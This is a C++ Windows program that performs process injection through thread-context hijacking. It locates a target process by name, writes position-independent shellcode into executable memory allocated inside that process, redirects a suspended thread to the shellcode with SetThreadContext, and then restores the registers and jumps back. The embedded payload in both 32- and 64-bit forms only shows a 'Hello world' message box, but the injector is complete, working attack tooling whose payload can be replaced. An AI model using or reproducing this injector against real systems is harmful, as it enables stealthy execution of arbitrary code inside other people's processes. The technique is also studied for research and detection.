#include <Windows.h>
#include <cstdio>
#include <tlhelp32.h>
#include <vector>

#include "../payload/shellcode.hpp"

// https://www.exploit-db.com/exploits/37758
// // https://github.com/NoviceLive/shellcoding/blob/master/windows/messagebox/messagebox32.asm
// this is 32 bit shellcode
/*char reigsterpreserving_shellcode[] = "\x60\x9c\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b"
"\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09"
"\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d"
"\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03"
"\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81"
"\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"
"\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03"
"\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3"
"\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68"
"\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68"
"\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9"
"\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"
"\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01"
"\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68"
"\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68"
"\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68"
"\x48\x65\x6c\x6c\x8b\xcc\x57\x57\x51\x57"
"\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
"\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78"
"\x69\x74\x54\x53\xff\xd6\x57\xff\xd0\x9d\x61\xE9\x00\x00\x00\x00";*/


#ifdef _WIN64
#define Xip Rip
// modified based on: https://gist.github.com/kkent030315/b508e56a5cb0e3577908484fa4978f12
// removed ExitProcesss
// added jmp to cleanup
char reigsterpreserving_shellcode[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

BYTE pushRegisters[] = {
		0x9C,														//pushfq	
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x44, 0x0F, 0x7F, 0x3C, 0x24,							//movdqu XMMWORD PTR [rsp],xmm15
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x44, 0x0F, 0x7F, 0x34, 0x24,							//movdqu XMMWORD PTR [rsp],xmm14
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x44, 0x0F, 0x7F, 0x2C, 0x24,							//movdqu XMMWORD PTR [rsp],xmm13
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x44, 0x0F, 0x7F, 0x24, 0x24,							//movdqu XMMWORD PTR [rsp],xmm12
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x44, 0x0F, 0x7F, 0x1C, 0x24,							//movdqu XMMWORD PTR [rsp],xmm11
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x44, 0x0F, 0x7F, 0x14, 0x24,							//movdqu XMMWORD PTR [rsp],xmm10
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x44, 0x0F, 0x7F, 0x0C, 0x24,							//movdqu XMMWORD PTR [rsp],xmm9
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x44, 0x0F, 0x7F, 0x04, 0x24,							//movdqu XMMWORD PTR [rsp],xmm8
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x0F, 0x7F, 0x3C, 0x24,								//movdqu XMMWORD PTR [rsp],xmm7
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x0F, 0x7F, 0x34, 0x24,								//movdqu XMMWORD PTR [rsp],xmm6
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x0F, 0x7F, 0x2C, 0x24,								//movdqu XMMWORD PTR [rsp],xmm5
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x0F, 0x7F, 0x24, 0x24,								//movdqu XMMWORD PTR [rsp],xmm4
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x0F, 0x7F, 0x1C, 0x24,								//movdqu XMMWORD PTR [rsp],xmm3
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x0F, 0x7F, 0x14, 0x24,								//movdqu XMMWORD PTR [rsp],xmm2
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x0F, 0x7F, 0x0C, 0x24,								//movdqu XMMWORD PTR [rsp],xmm1
		0x48, 0x83, 0xEC, 0x10,										//sub    rsp,0x10
		0xF3, 0x0F, 0x7F, 0x04, 0x24,								//movdqu XMMWORD PTR [rsp],xmm0
		0x41, 0x57,													//push   r15
		0x41, 0x56,													//push   r14
		0x41, 0x55,													//push   r13
		0x41, 0x54,													//push   r12
		0x41, 0x53,													//push   r11
		0x41, 0x52,													//push   r10
		0x41, 0x51,													//push   r9
		0x41, 0x50,													//push   r8
		0x57,														//push   rdi
		0x56,														//push   rsi
		0x55,														//push   rbp
		0x53,														//push   rbx
		0x52,														//push   rdx
		0x51,														//push   rcx
		0x50,														//push   rax
};

BYTE correctStackAndPopRegisters[] = {
	0x48, 0x81, 0xC4, 0x28, 0x00, 0x00, 0x00,				//add    rsp,0x1a8
0x58,														//pop    rax
0x59,														//pop    rcx
0x5A,														//pop    rdx
0x5B,														//pop    rbx
0x5D,														//pop    rbp
0x5E,														//pop    rsi
0x5F,														//pop    rdi
0x41, 0x58,													//pop    r8
0x41, 0x59,													//pop    r9
0x41, 0x5A,													//pop    r10
0x41, 0x5B,													//pop    r11
0x41, 0x5C,													//pop    r12
0x41, 0x5D,													//pop    r13
0x41, 0x5E,													//pop    r14
0x41, 0x5F,													//pop    r15
0xF3, 0x0F, 0x6F, 0x04, 0x24,								//movdqu xmm0,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x0F, 0x6F, 0x0C, 0x24,								//movdqu xmm1,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x0F, 0x6F, 0x14, 0x24,								//movdqu xmm2,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x0F, 0x6F, 0x1C, 0x24,								//movdqu xmm3,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x0F, 0x6F, 0x24, 0x24,								//movdqu xmm4,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x0F, 0x6F, 0x2C, 0x24,								//movdqu xmm5,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x0F, 0x6F, 0x34, 0x24,								//movdqu xmm6,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x0F, 0x6F, 0x3C, 0x24,								//movdqu xmm7,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x44, 0x0F, 0x6F, 0x04, 0x24,							//movdqu xmm8,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x44, 0x0F, 0x6F, 0x0C, 0x24,							//movdqu xmm9,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x44, 0x0F, 0x6F, 0x14, 0x24,							//movdqu xmm10,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x44, 0x0F, 0x6F, 0x1C, 0x24,							//movdqu xmm11,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x44, 0x0F, 0x6F, 0x24, 0x24,							//movdqu xmm12,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x44, 0x0F, 0x6F, 0x2C, 0x24,							//movdqu xmm13,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x44, 0x0F, 0x6F, 0x34, 0x24,							//movdqu xmm14,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x10
0xF3, 0x44, 0x0F, 0x6F, 0x3C, 0x24,							//movdqu xmm15,XMMWORD PTR[rsp]
0x48, 0x83, 0xC4, 0x10,										//add    rsp,0x20
0x9D														//popfq
};
#else
#define Xip Eip
/**
*	removed Exit process
*	start with saving registers (pushfd, pushad)
*	Correct stack for pushes of shellcode strings: added "add esp,0x4c"
*	restore saved registers (popfd, popad)
*	added jmp back at the end (jmp rel32)
*/
char reigsterpreserving_shellcode[] = "\x60\x9c\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b"
"\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09"
"\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d"
"\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03"
"\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81"
"\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"
"\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03"
"\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3"
"\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68"
"\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68"
"\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9"
"\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"
"\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01"
"\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68"
"\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68"
"\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68"
"\x48\x65\x6c\x6c\x8b\xcc\x57\x57\x51\x57"
"\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
"\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78"
"\x69\x74\x54\x53\xff\xd6\x83\xC4\x4C\x9d\x61\xE9\x00\x00\x00\x00"; // removed exit process, added "add esp,0x4c" (\x83\xC4\x4C), added jmp back
#endif

/**
* Injects shellcode into every thread of a process using Get/SetThreadContext.
*
*/
int main(int argc, char* argv[])
{
	const char* processName;

	if (argc != 2)
	{
		printf("Usage: *.exe processName\n");
		return 1;
	}
	
	processName = argv[1];

	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
	{
		printf("Error %d - Failed to CreateToolhelp32Snapshot\n", GetLastError());
		return 1;
	}

	// get first process of snapshot
	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	if (!Process32First(processesSnapshot, &processEntry))
	{
		printf("Error %d - Failed to Process32First\n", GetLastError());
		return 1;
	}

	bool foundTargetProcess = false;
	// iterate processes
	do
	{
		// check if we found the target process
		if (strcmpi(processEntry.szExeFile, processName) == 0)
		{
			foundTargetProcess = true;
			break;
		}
	} while (Process32Next(processesSnapshot, &processEntry));

	if (!foundTargetProcess)
	{
		printf("Error - Failed to find process: %s\n", processName);
		return 1;
	}

	printf("[Info] - Found Process %s with id %d\n", processName, processEntry.th32ProcessID);

	// acquire a handle to the target process
	HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
	if (!targetProcessHandle)
	{
		printf("Error %d - Failed to aquire process handle\n", GetLastError());
		return 1;
	}

	// allocate memory in target process
	LPVOID remoteMemory = VirtualAllocEx(targetProcessHandle, NULL, sizeof(reigsterpreserving_shellcode) - 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!remoteMemory)
	{
		printf("Error %d - Failed to allocate memory in target process\n", GetLastError());
		return 1;
	}

	printf("[Info] - Allocated remote memory at %p\n", remoteMemory);

	// get first thread of snapshot
	THREADENTRY32 currentThreadEntry = { sizeof(THREADENTRY32) };
	if (!Thread32First(processesSnapshot, &currentThreadEntry))
	{
		printf("Error %d - Failed to Thread32First\n", GetLastError());
		return 1;
	}

	// find to thread in the target processes and execute code by changing its CONTEXT
	do
	{
		if (currentThreadEntry.th32OwnerProcessID == processEntry.th32ProcessID)
		{
			HANDLE threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, currentThreadEntry.th32ThreadID);
			if (!threadHandle)
			{
				printf("[Warning] - Failed to acquire thread handle with error %d\n", GetLastError());
				continue;
			}
			if (SuspendThread(threadHandle) == -1)
			{
				printf("Error %d - Failed to suspend thread\n", GetLastError());
				return 1;
			}

			CONTEXT ctx{};
			ctx.ContextFlags = CONTEXT_ALL;
			if (!GetThreadContext(threadHandle, &ctx))
			{
				printf("Error %d - Failed to GetThreadContext\n", GetLastError());
				return 1;
			}

			printf("[Info] - Current instruction pointer %llx\n", ctx.Xip);

#ifdef _WIN64
			const int absoluteJmpLength = 14;
			int8_t absoluteJmp[absoluteJmpLength] =
			{
				0xff, 0x25, 0x0, 0x0, 0x0, 0x0,					//JMP[rip + 0]
				0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88	//absolute address of jump
			};
			// write jmp from messagebox shellcode to popRegisters
			*(int64_t*)&absoluteJmp[6] = (int64_t)remoteMemory + sizeof(pushRegisters) + sizeof(reigsterpreserving_shellcode) - 1;
			memcpy(&reigsterpreserving_shellcode[88], absoluteJmp, absoluteJmpLength);

			if (!WriteProcessMemory(targetProcessHandle, (int8_t*)remoteMemory, pushRegisters, sizeof(pushRegisters), NULL))
			{
				printf("Error %d - Failed to write pushRegisters shellcode to target process\n", GetLastError());
				return 1;
			}
			
			// the MessageBox shellcode will jump to pop registers as last step
			if (!WriteProcessMemory(targetProcessHandle, (int8_t*)remoteMemory + sizeof(pushRegisters), reigsterpreserving_shellcode, sizeof(reigsterpreserving_shellcode) - 1, NULL))
			{
				printf("Error %d - Failed to write MessageBox shellcode to target process\n", GetLastError());
				return 1;
			}
			
			// pop registers, thereby restoring the original register values
			if (!WriteProcessMemory(targetProcessHandle, (int8_t*)remoteMemory + sizeof(pushRegisters) + sizeof(reigsterpreserving_shellcode) -1, correctStackAndPopRegisters, sizeof(correctStackAndPopRegisters), NULL))
			{
				printf("Error %d - Failed to write shellcode to target process\n", GetLastError());
				return 1;
			}

			// write jmp back to the instruction the hijacked thread was going to execute next
			*(int64_t*)&absoluteJmp[6] = ctx.Xip;
			if (!WriteProcessMemory(targetProcessHandle, (int8_t*)remoteMemory + sizeof(pushRegisters) + sizeof(reigsterpreserving_shellcode) - 1 + sizeof(correctStackAndPopRegisters), absoluteJmp, sizeof(absoluteJmp), NULL))
			{
				printf("Error %d - Failed to write absoluteJmp to target process\n", GetLastError());
				return 1;
			}
#else
			//+6 because the five byte JMP and \0 charcter are the last thing sin the shellcode. -5 because the JMP instruction is realtive to the next instruction
			int32_t target = ctx.Xip - (int32_t)remoteMemory - sizeof(reigsterpreserving_shellcode) + 6 - 5;

			memcpy(&reigsterpreserving_shellcode[sizeof(reigsterpreserving_shellcode) - 5], &target, 4);
			// write shellcode into target process
			if (!WriteProcessMemory(targetProcessHandle, remoteMemory, reigsterpreserving_shellcode, sizeof(reigsterpreserving_shellcode) - 1, NULL))
			{
				printf("Error %d - Failed to write shellcode to target process\n", GetLastError());
				return 1;
			}
#endif
			printf("[Info] - Wrote shellcode to remote memory at %p\n", remoteMemory);

			ctx.Xip = (DWORD_PTR)remoteMemory;

			if (SetThreadContext(threadHandle, &ctx) == 0)
			{
				printf("Error %d - Failed to SetThreadContext\n", GetLastError());
				return 1;
			}

			printf("[Info] - SetThreadContext to execute %llx\n", ctx.Xip);

			if (ResumeThread(threadHandle) == -1)
			{
				printf("Error %d - Failed to resume thread\n", GetLastError());
				return 1;
			}

			printf("[Info] - Resumed hijacked thread\n");

			CloseHandle(threadHandle);
			return 0;
		}
	} while (Thread32Next(processesSnapshot, &currentThreadEntry));
	return 0;
}